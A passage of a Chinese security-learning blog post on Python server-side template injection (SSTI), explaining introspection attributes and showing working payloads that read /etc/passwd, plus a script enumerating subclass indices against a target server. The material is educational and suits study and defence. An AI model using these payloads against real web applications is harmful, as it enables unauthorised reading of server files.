&#x27;__main__.C&#x27;&gt;]</span></span><br><span class="line"><span class="built_in">print</span>(B.__subclasses__())  <span class="comment"># 输出 [&lt;class &#x27;__main__.D&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，类 <code>A</code> 有两个直接子类 <code>B</code> 和 <code>C</code>，类 <code>B</code> 有一个直接子类 <code>D</code>。因此，调用 <code>A.__subclasses__()</code> 返回的列表包含了 <code>B</code> 和 <code>C</code>，而调用 <code>B.__subclasses__()</code> 返回的列表只包含了 <code>D</code></p>
+<p><strong>注意：</strong>这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。</p>
+<p>当然我们也可以直接用<code>object.__subclasses__()</code>，会得到和上面一样的结果。SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p>
+<h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h3><p>在 Python 中，<code>__builtins__</code> 是一个指向内建模块（built-in module）的引用。这个模块包含了 Python 中内置的常用函数、异常和其他对象。</p>
+<p><code>__builtins__</code> 变量是一个字典，包含了内建模块中所有的内置函数和对象。你可以通过 <code>__builtins__</code> 字典来访问这些内置函数和对象。</p>
+<p>例如，你可以通过 <code>__builtins__[&#39;print&#39;]</code> 来访问内置的 <code>print</code> 函数，或者通过 <code>__builtins__[&#39;TypeError&#39;]</code> 来访问内置的 <code>TypeError</code> 异常类。</p>
+<p>但是在实际编码中，我们通常直接使用内置函数和对象的名称，而不是通过 <code>__builtins__</code> 来访问。例如，我们通常使用 <code>print()</code> 函数而不是 <code>__builtins__[&#39;print&#39;]</code>。</p>
+<p>需要注意的是，在一些限制性的环境中，比如一些解释器中或者在使用了 <code>__import__()</code> 函数时，可能会限制对 <code>__builtins__</code> 的直接访问。</p>
+<h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p>在 Python 中，<code>__globals__</code> 是一个特殊属性，用于访问包含当前作用域中所有全局变量的字典。这个属性是一个字典，它包含了当前作用域中所有全局变量的名称和对应的值。</p>
+<p>在 Python 中，每个作用域都有一个与之相关联的 <code>__globals__</code> 字典，用于存储该作用域中的全局变量。这个字典可以通过访问作用域对象的 <code>__globals__</code> 属性来获取</p>
+<p>例子如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = 10  # 定义一个全局变量 x</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    y = 20  # 定义一个局部变量 y</span><br><span class="line">    print(&quot;Global variables:&quot;, globals())  # 输出全局变量字典</span><br><span class="line">    print(&quot;Value of x:&quot;, globals()[&#x27;x&#x27;])  # 输出全局变量 x 的值</span><br><span class="line"></span><br><span class="line">func()  # 调用函数</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用-SSTI-读取文件"><a href="#利用-SSTI-读取文件" class="headerlink" title="利用 SSTI 读取文件"></a>利用 SSTI 读取文件</h2><h3 id="Python-2"><a href="#Python-2" class="headerlink" title="Python 2"></a>Python 2</h3><p>在上文中我们使用 <code>__subclasses__</code> 方法查看子类的时候，发现可以发现索引号为40指向file类：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()): <span class="built_in">print</span> i</span><br><span class="line">.....</span><br><span class="line">(<span class="number">0</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">1</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">2</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">3</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">4</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">5</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">6</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">7</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">8</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">9</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">10</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">11</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">12</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">13</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">14</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">15</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">16</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">17</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">18</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;)</span><br><span class="line">......</span><br><span class="line">(<span class="number">38</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">39</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">40</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">41</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">42</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">43</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p><code>for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print i</code>分析如下：</p>
+<ol>
+<li><code>&#39;&#39;.__class__</code>: 获取空字符串 <code>&#39;&#39;</code> 的类型，即 <code>str</code> 类型。</li>
+<li><code>&#39;&#39;.__class__.__mro__</code>: 获取 <code>str</code> 类型的方法解析顺序（Method Resolution Order，MRO），这是一个元组，包含了当前类和它的父类的顺序。</li>
+<li><code>&#39;&#39;.__class__.__mro__[-1]</code>: 获取方法解析顺序中的最后一个类，即 <code>object</code> 类。</li>
+<li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()</code>: 获取 <code>object</code> 类的所有子类，这是一个列表。</li>
+<li><code>enumerate(...)</code>: 对获取到的子类列表进行枚举，返回索引和对应的元素组成的元组。</li>
+<li><code>for i in ...: print i</code>: 遍历枚举后的元组列表，并打印每个元组。</li>
+</ol>
+<p>综上所述，这段代码的作用是遍历 <code>object</code> 类的所有直接子类，并输出它们的索引和对应的子类</p>
+<p>此file类可以直接用来读取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Python-3"><a href="#Python-3" class="headerlink" title="Python 3"></a>Python 3</h3><p>使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。</p>
+<p>首先编写脚本遍历目标Python环境中 <code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类索引号：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FileLoader&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到编号为79</span></span><br></pre></td></tr></table></figure>
+
+<p>所以payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[79][&quot;get_data&quot;](0, &quot;/etc/passwd&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>&#123;&#123; ... &#125;&#125;</code>: 双大括号通常用于表示模板语法，它们可能用于在某些 Web 框架中进行模板渲染，比如在前端的 Vue.js 或 AngularJS 中，或者在后端的像 Flask、Django 等 Web 框架中。</li>
+<li><code>().__class__</code>: 这是 Python 中创建一个空的元组，并访问该元组的类。元组的类是 <code>&lt;class &#39;tuple&#39;&gt;</code>。</li>
+<li><code>().__class__.__bases__</code>: 这是访问 <code>&lt;class &#39;tuple&#39;&gt;</code> 类的基类，它的基类是 <code>&lt;class &#39;object&#39;&gt;</code>。</li>
+<li><code>().__class__.__bases__[0]</code>: 这是获取 <code>&lt;class &#39;tuple&#39;&gt;</code> 类的基类中的第一个元素，即 <code>&lt;class &#39;object&#39;&gt;</code>。</li>
+<li><code>().__class__.__bases__[0].__subclasses__()</code>: 这是获取 Python 中 <code>&lt;class &#39;object&#39;&gt;</code> 类的所有子类。这个调用会返回一个包含所有子类的列表。</li>
+<li><code>[&quot;get_data&quot;]</code>: 这是对子类对象的属性进行访问，可能是希望访问第 79 个子类对象中名为 <code>get_data</code> 的方法。</li>
+<li><code>(0, &quot;/etc/passwd&quot;)</code>: 这是作为参数传递给 <code>get_data</code> 方法的值，可能是为了触发某种行为。</li>
+</ol>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">薯条</div><div class="post-copyright__author_desc">言念君子，温其如玉</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/')">ssti学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=ssti学习&amp;url=http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/python/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>python<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/img/Sherlock.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/02/27/php%E7%89%B9%E6%80%A7/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">php特性</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/01/15/python_max/python%E7%AC%94%E8%AE%B0/" title="python笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-01-15</div><div class="title">python笔记</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">信息安全</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">薯条</h1><div class="author-info__desc">言念君子，温其如玉</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/cina666" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">常用魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class"><span class="toc-number">1.1.</span> <span class="toc-text">__class__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">获取基类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-number">1.3.</span> <span class="toc-text">__subclasses__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins"><span class="toc-number">1.4.</span> <span class="toc-text">__builtins__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-number">1.5.</span> <span class="toc-text">__globals__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-SSTI-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">利用 SSTI 读取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-2"><span class="toc-number">2.1.</span> <span class="toc-text">Python 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-3"><span class="toc-number">2.2.</span> <span class="toc-text">Python 3</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/" title="ssti学习">ssti学习</a><time datetime="2024-03-01T11:35:21.000Z" title="Created 2024-03-01 19:35:21">2024-03-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/27/php%E7%89%B9%E6%80%A7/" title="php特性">php特性</a><time datetime="2024-02-27T15:03:18.000Z" title="Created 2024-02-27 23:03:18">2024-02-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0_max/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title="php反序列化学习">php反序列化学习</a><time datetime="2024-02-16T08:56:13.000Z" title="Created 2024-02-16 16:56:13">2024-02-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/" title="xss学习">xss学习</a><time datetime="2024-02-10T08:18:03.000Z" title="Created 2024-02-10 16:18:03">2024-02-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/30/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3_max/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3/" title="ROIS冬令营题解">ROIS冬令营题解</a><time datetime="2024-01-30T13:33:38.000Z" title="Created 2024-01-30 21:33:38">2024-01-30</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2024 By <a class="footer-bar-link" href="/" title="薯条" target="_blank">薯条</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">2</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/php-web/" style="font-size: 0.88rem;">-php -web<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF-web/" style="font-size: 0.88rem;">-前端 -web<sup>1</sup></a><a href="/tags/CTF/" style="font-size: 0.88rem;">CTF<sup>1</sup></a><a href="/tags/ctf/" style="font-size: 0.88rem;">ctf<sup>1</sup></a><a href="/tags/php/" style="font-size: 0.88rem;">php<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>2</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>3</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 0.88rem;">前端<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF/" style="font-size: 0.88rem;">后端<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i 